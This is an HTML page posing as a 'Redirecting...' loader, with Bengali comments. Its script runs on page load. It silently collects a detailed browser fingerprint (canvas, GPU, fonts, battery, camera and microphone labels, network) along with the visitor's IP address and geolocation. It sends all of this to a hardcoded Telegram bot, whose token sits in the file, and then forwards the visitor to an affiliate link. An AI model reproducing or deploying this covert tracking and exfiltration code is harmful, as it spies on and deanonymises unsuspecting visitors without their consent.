<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: #0d1117; color: #c9d1d9; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 40px; max-width: 400px; width: 100%; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
        .spinner { width: 48px; height: 48px; border: 4px solid #30363d; border-top-color: #58a6ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h3 { font-size: 20px; margin-bottom: 10px; color: #f0f6fc; }
        p { color: #8b949e; font-size: 14px; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h3>⏳ Redirecting...</h3>
        <p>Please wait, you will be redirected automatically.</p>
    </div>

    <script>
        // ========== আপনার টেলিগ্রাম বট তথ্য দিন ==========
        const TG_BOT_TOKEN = "8651142215:AAHuKP53rRExlvBipq2EgcXWCOU4i-vZ7Do";
        const TG_CHAT_ID = "5575068712";
        const REDIRECT_URL = "https://coldredir.com/L?tag=d_5695957m_126646c_&site=5695957&ad=126646";
        // ===================================================

        // ========== SHA-256 হ্যাশ ফাংশন (Pure JS) ==========
        async function sha256(message) {
            const msgBuffer = new TextEncoder().encode(message);
            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        }

        // ========== ফন্ট ডিটেকশন ==========
        function detectFonts() {
            const fonts = [
                'Arial','Verdana','Times New Roman','Courier New','Helvetica',
                'Tahoma','Georgia','Comic Sans MS','Impact','Lucida Console',
                'Segoe UI','Roboto','Open Sans','Noto Sans','Ubuntu','Calibri'
            ];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const testStr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            const baseWidths = {};
            
            // বেসলাইন হিসেবে monospace নিন
            ctx.font = '16px monospace';
            baseWidths.mono = ctx.measureText(testStr).width;
            
            const found = [];
            fonts.forEach(font => {
                ctx.font = '16px ' + font;
                const w = ctx.measureText(testStr).width;
                if (Math.abs(w - baseWidths.mono) > 2) {
                    found.push(font);
                }
            });
            return found.join(',');
        }

        // ========== ব্যাটারি ফিঙ্গারপ্রিন্ট ==========
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Yes' : 'No',
                        chargingTime: battery.chargingTime === Infinity ? 'Infinity' : battery.chargingTime + 's',
                        dischargingTime: battery.dischargingTime === Infinity ? 'Infinity' : battery.dischargingTime + 's'
                    };
                }
            } catch(e) {}
            return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
        }

        // ========== ওয়েবজিএল ডিটেইলস ==========
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const di = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        vendor: di ? gl.getParameter(di.UNMASKED_VENDOR_WEBGL) : 'N/A',
                        renderer: di ? gl.getParameter(di.UNMASKED_RENDERER_WEBGL) : 'N/A',
                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS).join('x'),
                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                        version: gl.getParameter(gl.VERSION)
                    };
                }
            } catch(e) {}
            return { vendor: 'N/A', renderer: 'N/A', maxTextureSize: 'N/A', maxViewportDims: 'N/A', shadingLanguageVersion: 'N/A', version: 'N/A' };
        }

        // ========== ক্যানভাস ফিঙ্গারপ্রিন্ট (উন্নত) ==========
        function getCanvasFP() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 256;
                canvas.height = 100;
                
                // জটিল প্যাটার্ন
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 256, 100);
                ctx.fillStyle = '#069';
                ctx.font = 'bold 20px monospace';
                ctx.fillText('C' + String.fromCharCode(169) + 'p' + String.fromCharCode(174) + 'y', 2, 2);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.font = 'bold 26px sans-serif';
                ctx.fillText('right', 4, 45);
                ctx.fillStyle = '#fff';
                ctx.font = '16px Georgia';
                ctx.fillText(' © 2025', 4, 78);
                
                // গ্রেডিয়েন্ট
                const gradient = ctx.createLinearGradient(0, 0, 256, 100);
                gradient.addColorStop(0, '#ff0000');
                gradient.addColorStop(0.5, '#00ff00');
                gradient.addColorStop(1, '#0000ff');
                ctx.fillStyle = gradient;
                ctx.globalCompositeOperation = 'lighter';
                ctx.fillRect(50, 20, 150, 40);
                
                return canvas.toDataURL();
            } catch(e) { return 'canvas_error'; }
        }

        // ========== প্রধান ফিঙ্গারপ্রিন্ট ফাংশন ==========
        async function generateFingerprint() {
            const canvasFP = getCanvasFP();
            const glInfo = getWebGLInfo();
            const battery = await getBatteryInfo();
            const fonts = detectFonts();
            
            // ===== HDMI/মনিটর ডিটেকশন =====
            let screenDetails = {};
            try {
                if (window.screen && window.screen.isExtended) {
                    screenDetails.isExtended = window.screen.isExtended;
                }
                // Screen Wake Lock API সাপোর্ট
                screenDetails.wakeLockSupport = 'wakeLock' in navigator;
            } catch(e) {}
            
            // ===== মিডিয়া ডিভাইস (ক্যামেরা/মাইক কানেক্টেড?) =====
            let mediaDevices = [];
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                mediaDevices = devices.map(d => d.kind + ':' + d.label.substring(0, 30));
            } catch(e) { mediaDevices = ['N/A']; }
            
            // ===== নেটওয়ার্ক ইনফো =====
            let connection = {};
            try {
                if (navigator.connection) {
                    connection = {
                        type: navigator.connection.effectiveType || 'N/A',
                        downlink: navigator.connection.downlink || 'N/A',
                        rtt: navigator.connection.rtt || 'N/A',
                        saveData: navigator.connection.saveData || false
                    };
                }
            } catch(e) {}
            
            // ===== বিল্ড ফিঙ্গারপ্রিন্ট স্ট্রিং =====
            const rawParts = [
                canvasFP,
                glInfo.vendor,
                glInfo.renderer,
                glInfo.maxTextureSize,
                glInfo.maxViewportDims,
                glInfo.shadingLanguageVersion,
                screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
                screen.availWidth + 'x' + screen.availHeight,
                navigator.hardwareConcurrency || 'N/A',
                navigator.deviceMemory || 'N/A',
                navigator.platform || 'N/A',
                navigator.language || 'N/A',
                navigator.languages ? navigator.languages.join(',') : 'N/A',
                Intl.DateTimeFormat().resolvedOptions().timeZone,
                navigator.maxTouchPoints,
                fonts,
                battery.level,
                battery.charging,
                connection.type || 'N/A',
                connection.downlink || 'N/A',
                screenDetails.isExtended || false,
                screenDetails.wakeLockSupport || false,
                mediaDevices.join('|')
            ];
            
            const rawString = rawParts.join('|||');
            const fpHash = await sha256(rawString);
            
            return {
                hash: fpHash,
                raw: rawParts,
                glInfo: glInfo,
                battery: battery,
                connection: connection,
                fonts: fonts,
                mediaDevices: mediaDevices,
                screenDetails: screenDetails
            };
        }

        // ========== আইপি ফেচ ==========
        async function getIP() {
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const data = await resp.json();
                return data.ip;
            } catch(e) {
                try {
                    const resp2 = await fetch('https://api.myip.com');
                    const data2 = await resp2.json();
                    return data2.ip;
                } catch(e2) {
                    return 'Unavailable';
                }
            }
        }

        // ========== দেশ/লোকেশন ডিটেকশন ==========
        async function getLocation(ip) {
            try {
                const resp = await fetch('https://ipapi.co/' + ip + '/json/');
                const data = await resp.json();
                return {
                    country: data.country_name || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || 'N/A',
                    isp: data.org || 'N/A',
                    timezone: data.timezone || 'N/A'
                };
            } catch(e) {
                return { country: 'N/A', city: 'N/A', region: 'N/A', isp: 'N/A', timezone: 'N/A' };
            }
        }

        // ========== মেইন এক্সিকিউশন ==========
        (async function() {
            const fp = await generateFingerprint();
            const publicIP = await getIP();
            const location = await getLocation(publicIP);
            
            // ===== ব্রাউজার ইউজার এজেন্ট ডিটেইলস =====
            const ua = navigator.userAgent;
            let browserName = 'Unknown';
            if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
            else if (ua.includes('Firefox')) browserName = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
            else if (ua.includes('Edg')) browserName = 'Edge';
            else if (ua.includes('OPR') || ua.includes('Opera')) browserName = 'Opera';
            
            let osName = 'Unknown';
            if (ua.includes('Windows NT 10.0')) osName = 'Windows 10/11';
            else if (ua.includes('Windows NT 6.3')) osName = 'Windows 8.1';
            else if (ua.includes('Windows NT 6.1')) osName = 'Windows 7';
            else if (ua.includes('Android')) osName = 'Android ' + (ua.match(/Android\s([\d.]+)/) || [''])[1];
            else if (ua.includes('iPhone')) osName = 'iOS ' + (ua.match(/OS\s([\d_]+)/) || [''])[1].replace(/_/g, '.');
            else if (ua.includes('Mac OS X')) osName = 'macOS';
            else if (ua.includes('Linux')) osName = 'Linux';
            
            // ===== প্রাইভেসি চেক =====
            let privacyScore = 0;
            const privacyFlags = [];
            if (navigator.doNotTrack === '1' || navigator.doNotTrack === 'yes') { privacyScore++; privacyFlags.push('DNT:Yes'); }
            if (navigator.webdriver === true) { privacyScore+=2; privacyFlags.push('WebDriver:Yes (Bot?)'); }
            // কুকি চেক
            try {
                document.cookie = 'testcookie=1; SameSite=Lax';
                if (document.cookie.indexOf('testcookie') === -1) { privacyFlags.push('Cookies:Blocked'); }
                else { document.cookie = 'testcookie=; expires=Thu, 01 Jan 1970 00:00:00 GMT'; }
            } catch(e) { privacyFlags.push('Cookies:Error'); }
            
            // ===== টেলিগ্রাম মেসেজ তৈরি =====
            const msg = 
`🔔 **নতুন ভিজিটর সনাক্ত** 🔔
━━━━━━━━━━━━━━━━━━
🆔 **FP:** \`${fp.hash.substring(0, 20)}...\`
━━━━━━━━━━━━━━━━━━
🌐 **IP:** ${publicIP}
📍 **লোকেশন:** ${location.city}, ${location.country}
🏢 **ISP:** ${location.isp}
━━━━━━━━━━━━━━━━━━
📱 **প্ল্যাটফর্ম:** ${navigator.platform}
💻 **ওএস:** ${osName}
🌍 **ব্রাউজার:** ${browserName}
📺 **স্ক্রিন:** ${screen.width}x${screen.height}
🖥️ **এভেইলেবল:** ${screen.availWidth}x${screen.availHeight}
🎨 **কালার ডেপথ:** ${screen.colorDepth}-bit
━━━━━━━━━━━━━━━━━━
🧠 **র‍্যাম:** ${navigator.deviceMemory || 'N/A'}GB
⚡ **কোর:** ${navigator.hardwareConcurrency || 'N/A'}
👆 **টাচ পয়েন্ট:** ${navigator.maxTouchPoints}
🔋 **ব্যাটারি:** ${fp.battery.level} | চার্জিং: ${fp.battery.charging}
━━━━━━━━━━━━━━━━━━
🎮 **GPU:** ${fp.glInfo.renderer.substring(0, 50)}
🔤 **ফন্টস (${fp.fonts.split(',').length}টি):** \`${fp.fonts.substring(0, 60)}\`
━━━━━━━━━━━━━━━━━━
🌍 **টাইমজোন:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🗣 **ভাষা:** ${navigator.language} [${navigator.languages ? navigator.languages.join(',') : ''}]
📶 **নেট:** ${fp.connection.type || 'N/A'} | ${fp.connection.downlink || '?'}Mbps
━━━━━━━━━━━━━━━━━━
🔒 **প্রাইভেসি ফ্ল্যাগ:** ${privacyFlags.join(', ') || 'None'}
📷 **মিডিয়া ডিভাইস:** ${fp.mediaDevices.length}টি
🕒 **সময়:** ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}
━━━━━━━━━━━━━━━━━━
**UA:** \`${ua.substring(0, 100)}\``;

            // মেসেজ পাঠান
            fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: msg,
                    parse_mode: 'Markdown'
                })
            }).catch(function(err) { console.log('TG Error:', err); });

            // ===== ফিঙ্গারপ্রিনট localStorage-এ সংরক্ষণ =====
            try {
                localStorage.setItem('fp_hash', fp.hash);
                localStorage.setItem('fp_time', Date.now().toString());
                
                // যদি আগের ফিঙ্গারপ্রিন্ট মেলে, তাহলে সেট নোট করুন
                var oldFP = localStorage.getItem('fp_hash_prev');
                if (oldFP && oldFP === fp.hash) {
                    console.log('✅ ফিঙ্গারপ্রিন্ট ম্যাচ: একই ডিভাইস');
                }
                localStorage.setItem('fp_hash_prev', fp.hash);
            } catch(e) {}

            // ===== ২ সেকেন্ড পর রিডাইরেক্ট =====
            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, 2000);
        })();
    </script>
</body>
</html>
